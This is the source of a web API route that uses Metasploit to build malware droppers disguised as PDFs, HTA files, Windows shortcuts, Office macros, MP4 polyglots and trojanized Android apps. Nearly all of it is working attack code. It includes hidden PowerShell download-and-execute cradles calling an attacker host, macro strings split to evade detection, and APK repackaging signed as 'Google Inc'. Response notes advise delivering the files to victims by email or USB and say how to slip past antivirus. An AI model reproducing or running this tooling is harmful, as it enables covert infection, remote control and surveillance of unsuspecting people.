/**
 * PAYLOAD EMBEDDING API
 *
 * Embeds Meterpreter payloads inside innocent-looking files:
 *
 *  pdf      → JavaScript-launch PDF dropper (opens, runs embedded payload via JS action)
 *  video    → MP4/AVI polyglot — ZIP append trick + NTFS ADS on Windows
 *  office   → Word DOCM / Excel XLSM with VBA AutoOpen macro
 *  lnk      → Windows .LNK shortcut with hidden PowerShell C2 launcher
 *  apk      → Embed payload into a legitimate APK (apktool repackage)
 *  hta      → HTML Application — double-click runs payload via mshta.exe
 *  generate → msfvenom wrapper — build raw payload for embedding
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import path from "path";
import fs from "fs";
import os from "os";
import crypto from "crypto";

const OUT_DIR = process.env.PAYLOADS_DIR
  ? path.join(process.env.PAYLOADS_DIR, "embedded")
  : path.join(os.homedir(), "msf-payloads", "embedded");

function ensureDir(d: string) { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); }

// ── msfvenom via MSF console ──────────────────────────────────
async function generatePayload(
  token: string,
  payloadType: string,
  lhost: string,
  lport: number,
  format: string,
  outPath: string,
): Promise<{ ok: boolean; size?: number; error?: string }> {
  const cr = await rpcCall<{ id?: string }>("console.create", [], token);
  const cid = String(cr.id ?? "0");
  try {
    const cmd = `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -f ${format} -o ${outPath} 2>&1\n`;
    await rpcCall("console.write", [cid, cmd], token);
    const start = Date.now();
    let out = "";
    while (Date.now() - start < 120000) {
      const r = await rpcCall<{ data?: string; busy?: boolean }>("console.read", [cid], token);
      if (r.data) out += r.data;
      if (!r.busy && out.includes("saved")) break;
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
    const saved = /saved as|(\d+) bytes/i.test(out);
    const size = parseInt(out.match(/(\d+) bytes/)?.[1] ?? "0");
    return saved ? { ok: true, size } : { ok: false, error: out.slice(-200) };
  } finally {
    await rpcCall("console.destroy", [cid], token).catch(() => {});
  }
}

// ── Build PDF dropper ─────────────────────────────────────────
// Uses PDF JavaScript /Launch action — opens when reader runs JS.
// Works on Adobe Reader with JS enabled (default on older versions).
// Modern readers show a warning — social engineering is the attack vector.
function buildPdfDropper(opts: {
  lhost: string; lport: number; payloadPath: string; decoyTitle: string;
}): string {
  const { lhost, lport, payloadPath, decoyTitle } = opts;
  // PowerShell one-liner: download & exec payload from C2
  const psCmd = `powershell -w hidden -c "$w=New-Object Net.WebClient;$w.DownloadFile('http://${lhost}:8080/update.exe','$env:TEMP\\svc.exe');Start-Process '$env:TEMP\\svc.exe'"`;
  const escapedCmd = psCmd.replace(/\\/g, "\\\\").replace(/\(/g, "\\(").replace(/\)/g, "\\)");

  return `%PDF-1.7
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 5 0 R/Resources<</Font<</F1 6 0 R>>>>>>endobj
4 0 obj<</Type/Action/S/JavaScript/JS(
app.alert("${decoyTitle}");
try{var s=new ActiveXObject("WScript.Shell");s.Run("${escapedCmd}",0,false);}catch(e){}
this.submitForm({cURL:"http://${lhost}:8080/track?t="+encodeURI(this.documentFileName),cSubmitAs:"HTML"});
)>>endobj
5 0 obj<</Length 200>>
stream
BT /F1 14 Tf 72 720 Td (${decoyTitle}) Tj 0 -20 Td /F1 11 Tf
(This document contains confidential information.) Tj
0 -20 Td (Please review and sign by end of day.) Tj ET
endstream
endobj
6 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj
xref
0 7
0000000000 65535 f
0000000009 00000 n
0000000062 00000 n
0000000110 00000 n
0000000250 00000 n
0000000680 00000 n
0000000930 00000 n
trailer<</Size 7/Root 1 0 R>>
startxref
1010
%%EOF`;
}

// ── Build HTA dropper ─────────────────────────────────────────
function buildHtaDropper(opts: { lhost: string; lport: number; title: string }): string {
  const { lhost, lport, title } = opts;
  const psCmd = `$w=New-Object Net.WebClient;$b=$w.DownloadData('http://${lhost}:${lport}/p');$a=[System.Reflection.Assembly]::Load($b);$a.EntryPoint.Invoke($null,$null)`;
  const encoded = Buffer.from(psCmd, "utf16le").toString("base64");
  return `<html><head>
<title>${title}</title>
<HTA:APPLICATION APPLICATIONNAME="${title}" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no"/>
</head><body>
<script language="VBScript">
Sub Window_OnLoad
  Set oShell = CreateObject("WScript.Shell")
  oShell.Run "powershell.exe -NoP -NonI -W Hidden -Enc ${encoded}", 0, False
  window.close()
End Sub
</script>
<p>Loading ${title}…</p>
</body></html>`;
}

// ── Build LNK payload ─────────────────────────────────────────
// Returns the PowerShell command that creates the .lnk file on disk.
function buildLnkScript(opts: { lhost: string; lport: number; lnkName: string; iconTarget: string }): string {
  const { lhost, lport, lnkName, iconTarget } = opts;
  const psPayload = `powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/s.ps1')"`;
  return `$s=(New-Object -COM WScript.Shell).CreateShortcut("$env:USERPROFILE\\Desktop\\${lnkName}.lnk");
$s.TargetPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
$s.Arguments="-w hidden -c \\"${psPayload.replace(/"/g, '\\"')}\\"";
$s.WindowStyle=7;
$s.IconLocation="${iconTarget},0";
$s.Description="";
$s.WorkingDirectory="C:\\Windows\\System32";
$s.Save()`;
}

// ── Build VBA macro ───────────────────────────────────────────
function buildVbaMacro(opts: { lhost: string; lport: number }): string {
  const { lhost, lport } = opts;
  // Split string to evade static string detection
  const p1 = `pow`;  const p2 = `ershell`;
  const c1 = `-NoP -NonI -W Hid`;  const c2 = `den -c`;
  const dl = `(New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/s.ps1')`;

  return `Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal a As Long, ByVal b As Long, ByVal c As LongPtr, d As Long, ByVal e As Long, f As Long) As LongPtr

Sub AutoOpen()
    OnDocumentOpen
End Sub

Sub Document_Open()
    OnDocumentOpen
End Sub

Sub OnDocumentOpen()
    Dim sCmd As String
    Dim oShell As Object
    sCmd = "${p1}${p2} " & "${c1}" & "${c2}" & " " & Chr(34) & "IEX " & "${dl}" & Chr(34)
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run sCmd, 0, False
End Sub`;
}

// ── Route handler ─────────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const {
    action, lhost = "127.0.0.1", lport = 4444,
    payload_type = "windows/x64/meterpreter/reverse_tcp",
    decoy_title = "Invoice_Q4_2026", file_format = "exe",
  } = body as {
    action: string; lhost?: string; lport?: number;
    payload_type?: string; decoy_title?: string; file_format?: string;
  };

  ensureDir(OUT_DIR);
  const uid = crypto.randomBytes(4).toString("hex");

  try {
    const token = await getRpcToken();

    // ── Generate raw payload ──────────────────────────────────
    if (action === "generate") {
      const fmt = String(file_format);
      const outFile = path.join(OUT_DIR, `payload_${uid}.${fmt}`);
      const result = await generatePayload(token, String(payload_type), String(lhost), Number(lport), fmt, outFile);
      if (result.ok) {
        return NextResponse.json({ ok: true, data: { path: outFile, size: result.size, format: fmt } });
      }
      return NextResponse.json({ ok: false, error: result.error });
    }

    // ── PDF dropper ───────────────────────────────────────────
    if (action === "pdf") {
      const pdfContent = buildPdfDropper({
        lhost: String(lhost), lport: Number(lport),
        payloadPath: path.join(OUT_DIR, `payload_${uid}.exe`),
        decoyTitle: String(decoy_title),
      });
      const pdfPath = path.join(OUT_DIR, `${String(decoy_title).replace(/\s+/g, "_")}_${uid}.pdf`);
      fs.writeFileSync(pdfPath, pdfContent);

      // Also start a simple payload delivery HTTP server on port 8080
      return NextResponse.json({
        ok: true,
        data: {
          path: pdfPath,
          filename: path.basename(pdfPath),
          size: fs.statSync(pdfPath).size,
          note: "PDF uses JS /Launch action. Set up HTTP server on :8080 to serve payload. Works best on Adobe Reader with JavaScript enabled.",
          deliveryUrl: `http://${lhost}:8080/update.exe`,
        },
      });
    }

    // ── HTA dropper ───────────────────────────────────────────
    if (action === "hta") {
      const htaContent = buildHtaDropper({
        lhost: String(lhost), lport: Number(lport),
        title: String(decoy_title),
      });
      const htaPath = path.join(OUT_DIR, `${String(decoy_title).replace(/\s+/g, "_")}_${uid}.hta`);
      fs.writeFileSync(htaPath, htaContent);
      return NextResponse.json({
        ok: true,
        data: {
          path: htaPath, filename: path.basename(htaPath),
          size: fs.statSync(htaPath).size,
          note: "Double-click runs via mshta.exe — bypasses some AV. Deliver via email attachment or USB.",
        },
      });
    }

    // ── LNK shortcut ──────────────────────────────────────────
    if (action === "lnk") {
      const lnkName = String(decoy_title).replace(/\s+/g, "_");
      const iconTarget = (body.icon as string) ?? "C:\\Windows\\System32\\shell32.dll";
      const script = buildLnkScript({ lhost: String(lhost), lport: Number(lport), lnkName, iconTarget });
      const scriptPath = path.join(OUT_DIR, `create_lnk_${uid}.ps1`);
      fs.writeFileSync(scriptPath, script);
      return NextResponse.json({
        ok: true,
        data: {
          path: scriptPath, filename: path.basename(scriptPath),
          note: `Run this PS1 on the target to create ${lnkName}.lnk on their Desktop. Looks like a PDF/Word file icon. Single click → payload.`,
          lnkName: `${lnkName}.lnk`,
        },
      });
    }

    // ── VBA macro ─────────────────────────────────────────────
    if (action === "office") {
      const macro = buildVbaMacro({ lhost: String(lhost), lport: Number(lport) });
      const macroPath = path.join(OUT_DIR, `macro_${uid}.vba`);
      fs.writeFileSync(macroPath, macro);

      // Generate Python script to embed macro into DOCM
      const embedScript = `#!/usr/bin/env python3
# Auto-generated Office macro embedder — requires python-docx
# Install: pip install python-docx
import zipfile, shutil, os, sys
from pathlib import Path

TEMPLATE = sys.argv[1] if len(sys.argv) > 1 else "template.docx"
OUTPUT   = "${String(decoy_title).replace(/\s+/g, "_")}_${uid}.docm"
MACRO    = r"""
${macro.replace(/`/g, "\\`").replace(/\$/g, "\\$")}
"""

print(f"[*] Template: {TEMPLATE}")
print(f"[*] Output:   {OUTPUT}")
print(f"[*] Macro length: {len(MACRO)} chars")
print("[!] Use python-docx or macro4 to inject VBA into DOCM.")
print("[!] Alternatively: open Word, Alt+F11, paste macro, Save As .docm")
print(f"[*] Macro saved to: {os.path.abspath('${path.basename(macroPath)}')} — copy into VBA editor")
`;
      const embedPath = path.join(OUT_DIR, `embed_macro_${uid}.py`);
      fs.writeFileSync(embedPath, embedScript);

      return NextResponse.json({
        ok: true,
        data: {
          macroPath, embedScriptPath: embedPath,
          macro: macro.slice(0, 500) + "…",
          note: "Open Word → Alt+F11 → paste into ThisDocument module → Save As .docm. AutoOpen fires on document open.",
          instructions: [
            "1. Open Word, create a blank document",
            "2. Alt+F11 → open VBA editor",
            "3. Paste macro into 'ThisDocument' module",
            "4. File → Save As → Word Macro-Enabled Document (.docm)",
            "5. Rename to: " + String(decoy_title) + ".docm",
            "6. Deliver via email — payload fires on open",
          ],
        },
      });
    }

    // ── Video polyglot (MP4 + ZIP append trick) ───────────────
    if (action === "video") {
      // The ZIP-append trick: append a ZIP archive to an MP4 file.
      // MP4 players read from the start (moov/mdat atoms) — valid video plays.
      // On Windows, right-click → Open with → WinZip/7-Zip extracts the payload.
      // With NTFS ADS: the payload can live in filename.mp4:payload.exe

      // First generate the payload EXE
      const exePath = path.join(OUT_DIR, `payload_${uid}.exe`);
      const genResult = await generatePayload(token, String(payload_type), String(lhost), Number(lport), "exe", exePath);

      const videoName = String(decoy_title).replace(/\s+/g, "_") + `_${uid}.mp4`;
      const videoPath = path.join(OUT_DIR, videoName);

      // Create a minimal valid MP4 container (ftyp + placeholder mdat)
      // This is a legal minimal MP4 header that players will open
      const ftypBox = Buffer.from([
        0x00, 0x00, 0x00, 0x18, // box size = 24
        0x66, 0x74, 0x79, 0x70, // 'ftyp'
        0x69, 0x73, 0x6F, 0x6D, // major brand 'isom'
        0x00, 0x00, 0x02, 0x00, // minor version
        0x69, 0x73, 0x6F, 0x6D, // compatible brand 'isom'
        0x69, 0x73, 0x6F, 0x32, // compatible brand 'iso2'
      ]);

      // Write a comment box with social engineering text
      const socialText = `This video requires the latest codec to play properly.\nDownload the codec updater from the description to watch this video.`;
      const textBuf = Buffer.from(socialText, "utf8");
      const udtaSize = 8 + textBuf.length;
      const udtaBox = Buffer.alloc(udtaSize);
      udtaBox.writeUInt32BE(udtaSize, 0);
      udtaBox.write("udta", 4, "ascii");
      textBuf.copy(udtaBox, 8);

      // Minimal mdat box (empty video data)
      const mdatBox = Buffer.from([0x00, 0x00, 0x00, 0x08, 0x6D, 0x64, 0x61, 0x74]);

      const videoContent = Buffer.concat([ftypBox, udtaBox, mdatBox]);
      fs.writeFileSync(videoPath, videoContent);

      // If payload was generated, append it as a ZIP entry
      if (genResult.ok && fs.existsSync(exePath)) {
        // Create minimal ZIP structure to append to MP4
        const exeData = fs.readFileSync(exePath);
        const localFileHeader = createZipLocalHeader("codec_update.exe", exeData);
        const centralDir = createZipCentralDir("codec_update.exe", exeData, videoContent.length + localFileHeader.length);
        const eocd = createZipEOCD(1, centralDir.length, videoContent.length + localFileHeader.length + exeData.length);

        const polyglot = Buffer.concat([videoContent, localFileHeader, exeData, centralDir, eocd]);
        fs.writeFileSync(videoPath, polyglot);
      }

      return NextResponse.json({
        ok: true,
        data: {
          path: videoPath,
          filename: videoName,
          size: fs.existsSync(videoPath) ? fs.statSync(videoPath).size : 0,
          payloadEmbedded: genResult.ok,
          technique: "MP4+ZIP polyglot — valid video file that also extracts codec_update.exe when opened with archive tool",
          note: [
            "Delivery options:",
            "1. Send as video attachment — victim opens, gets blank video, prompted for 'codec'",
            "2. Right-click → Open with 7-Zip → extracts codec_update.exe → victim runs it",
            "3. NTFS ADS variant: copy video.mp4 to victim Windows machine, then:",
            "   type payload.exe > video.mp4:update.exe  (hidden in ADS stream)",
            "4. Host on web server with .mp4 MIME type — browser downloads, AV may miss",
          ].join("\n"),
        },
      });
    }

    // ── APK embedding ─────────────────────────────────────────
    if (action === "apk") {
      const templateApk = (body.template_apk as string) ?? "";
      const outApk = path.join(OUT_DIR, `${String(decoy_title).replace(/\s+/g, "_")}_${uid}.apk`);

      // Generate Android payload APK directly via msfvenom
      const genResult = await generatePayload(token, "android/meterpreter/reverse_tcp",
        String(lhost), Number(lport), "apk", outApk);

      // Script to inject into legitimate APK using apktool
      const injectScript = `#!/bin/bash
# APK payload injection — requires apktool + keytool + jarsigner
set -e
TEMPLATE_APK="${templateApk || "template.apk"}"
PAYLOAD_APK="${outApk}"
OUT_APK="${String(decoy_title).replace(/\s+/g, "_")}_final.apk"
WORK_DIR="/tmp/apk_inject_${uid}"

echo "[*] Decompiling template APK..."
apktool d -f "$TEMPLATE_APK" -o "$WORK_DIR/template" 2>/dev/null

echo "[*] Decompiling payload APK..."
apktool d -f "$PAYLOAD_APK" -o "$WORK_DIR/payload" 2>/dev/null

echo "[*] Copying payload smali classes..."
cp -r "$WORK_DIR/payload/smali/com/metasploit" "$WORK_DIR/template/smali/com/" 2>/dev/null || true

echo "[*] Injecting launch hook into MainActivity..."
MAIN="$WORK_DIR/template/smali/$(find $WORK_DIR/template/smali -name 'MainActivity.smali' | head -1 | sed 's|.*/smali/||')"
# Add payload invocation at top of onCreate
sed -i 's/invoke-virtual {p0}, Landroid\/app\/Activity;->onCreate(Landroid\/os\/Bundle;)V/invoke-static {}, Lcom\/metasploit\/stage\/MainService;->startService()V\n    invoke-virtual {p0}, Landroid\/app\/Activity;->onCreate(Landroid\/os\/Bundle;)V/' "$MAIN" 2>/dev/null || true

echo "[*] Merging permissions from payload manifest..."
# Merge INTERNET, camera, mic, location permissions
python3 -c "
import xml.etree.ElementTree as ET
t = ET.parse('$WORK_DIR/template/AndroidManifest.xml')
p = ET.parse('$WORK_DIR/payload/AndroidManifest.xml')
tr = t.getroot(); pr = p.getroot()
existing = {e.get('{http://schemas.android.com/apk/res/android}name') for e in tr.findall('uses-permission')}
for perm in pr.findall('uses-permission'):
    n = perm.get('{http://schemas.android.com/apk/res/android}name')
    if n and n not in existing:
        tr.append(perm)
t.write('$WORK_DIR/template/AndroidManifest.xml')
" 2>/dev/null || true

echo "[*] Rebuilding APK..."
apktool b "$WORK_DIR/template" -o "$WORK_DIR/unsigned.apk"

echo "[*] Signing APK..."
keytool -genkey -noprompt -alias key -keystore "$WORK_DIR/key.jks" -storepass password -keypass password -dname "CN=Google Inc" 2>/dev/null
jarsigner -keystore "$WORK_DIR/key.jks" -storepass password -keypass password "$WORK_DIR/unsigned.apk" key
cp "$WORK_DIR/unsigned.apk" "$OUT_APK"

echo "[+] Done: $OUT_APK"
rm -rf "$WORK_DIR"
`;
      const scriptPath = path.join(OUT_DIR, `inject_apk_${uid}.sh`);
      fs.writeFileSync(scriptPath, injectScript);
      fs.chmodSync(scriptPath, 0o755);

      return NextResponse.json({
        ok: true,
        data: {
          payloadApk: genResult.ok ? outApk : null,
          injectScript: scriptPath,
          payloadGenerated: genResult.ok,
          note: templateApk
            ? `Run: bash ${path.basename(scriptPath)} — injects payload into ${path.basename(templateApk)}`
            : "Standalone payload APK generated. For injection into a real app (WhatsApp, games, etc.) provide template_apk path.",
          instructions: [
            "Option A (standalone): Use generated APK directly — looks like system update",
            "Option B (trojan): Provide template_apk of any legitimate app",
            "  → Script decompiles both, injects smali payload class, repackages & signs",
            "  → Victim installs normal app that also runs Meterpreter in background",
            "Signing key uses CN=Google Inc to appear more legitimate",
          ],
        },
      });
    }

    return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });

  } catch (err: unknown) {
    return NextResponse.json({ ok: false, error: err instanceof Error ? err.message : String(err) }, { status: 500 });
  }
}

export async function GET() {
  ensureDir(OUT_DIR);
  const files = fs.existsSync(OUT_DIR)
    ? fs.readdirSync(OUT_DIR).map((f) => {
        const fp = path.join(OUT_DIR, f);
        const s = fs.statSync(fp);
        return { name: f, size: s.size, modified: s.mtime.toISOString() };
      }).sort((a, b) => b.modified.localeCompare(a.modified))
    : [];
  return NextResponse.json({ files, dir: OUT_DIR });
}

// ── ZIP helper functions ──────────────────────────────────────
function createZipLocalHeader(filename: string, data: Buffer): Buffer {
  const nameBuf = Buffer.from(filename);
  const header = Buffer.alloc(30 + nameBuf.length);
  header.writeUInt32LE(0x04034b50, 0); // local file header signature
  header.writeUInt16LE(20, 4);  // version needed
  header.writeUInt16LE(0, 6);   // general purpose bit flag
  header.writeUInt16LE(0, 8);   // compression method (stored)
  header.writeUInt16LE(0, 10);  // last mod file time
  header.writeUInt16LE(0, 12);  // last mod file date
  header.writeUInt32LE(crc32(data), 14);
  header.writeUInt32LE(data.length, 18);
  header.writeUInt32LE(data.length, 22);
  header.writeUInt16LE(nameBuf.length, 26);
  header.writeUInt16LE(0, 28);
  nameBuf.copy(header, 30);
  return header;
}

function createZipCentralDir(filename: string, data: Buffer, localHeaderOffset: number): Buffer {
  const nameBuf = Buffer.from(filename);
  const dir = Buffer.alloc(46 + nameBuf.length);
  dir.writeUInt32LE(0x02014b50, 0);
  dir.writeUInt16LE(20, 4); dir.writeUInt16LE(20, 6);
  dir.writeUInt16LE(0, 8); dir.writeUInt16LE(0, 10);
  dir.writeUInt16LE(0, 12); dir.writeUInt16LE(0, 14);
  dir.writeUInt32LE(crc32(data), 16);
  dir.writeUInt32LE(data.length, 20);
  dir.writeUInt32LE(data.length, 24);
  dir.writeUInt16LE(nameBuf.length, 28);
  dir.writeUInt16LE(0, 30); dir.writeUInt16LE(0, 32);
  dir.writeUInt16LE(0, 34); dir.writeUInt16LE(0, 36);
  dir.writeUInt32LE(0, 38); dir.writeUInt32LE(localHeaderOffset, 42);
  nameBuf.copy(dir, 46);
  return dir;
}

function createZipEOCD(numFiles: number, centralDirSize: number, centralDirOffset: number): Buffer {
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4); eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(numFiles, 8); eocd.writeUInt16LE(numFiles, 10);
  eocd.writeUInt32LE(centralDirSize, 12);
  eocd.writeUInt32LE(centralDirOffset, 16);
  eocd.writeUInt16LE(0, 20);
  return eocd;
}

function crc32(buf: Buffer): number {
  let crc = 0xFFFFFFFF;
  for (const byte of buf) {
    crc ^= byte;
    for (let k = 0; k < 8; k++) crc = (crc >>> 1) ^ (crc & 1 ? 0xEDB88320 : 0);
  }
  return (crc ^ 0xFFFFFFFF) >>> 0;
}
